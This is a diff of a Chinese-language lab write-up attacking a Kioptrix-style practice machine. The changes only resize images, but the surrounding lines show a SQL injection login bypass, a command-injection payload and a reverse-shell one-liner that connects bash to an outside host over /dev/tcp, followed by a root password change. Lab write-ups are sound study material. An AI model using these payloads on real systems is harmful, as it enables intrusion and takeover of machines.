@@ -101,7 +101,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 访问首页访问源代码，发现一个登录页面：
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png" width="56%" />
 
 
 ~~~html
@@ -145,15 +145,15 @@ OS and Service detection performed. Please report any incorrect results at https
 >
 > `psw:' or '1'='1`
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png" width="56%" />
 
 `payload:127.0.0.1;pwd;whoami;`
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png" width="56%" />
 
 寻找写权限的目录：
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png" width="56%" />
 
 > 弹shell
 
@@ -161,7 +161,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 `192.168.1.7;bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/8888 <&1';`
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png" width="56%" />
 
 
 
@@ -182,7 +182,7 @@ Changing password for user root.
 passwd: all authentication tokens updated successfully.
 ~~~
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" style="zoom:50%" />
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" width="56%" />
 
 # 3. 遗留问题
 **提权脚本那么多，除了一条一条的尝试之外，有没有更快捷的办法？**
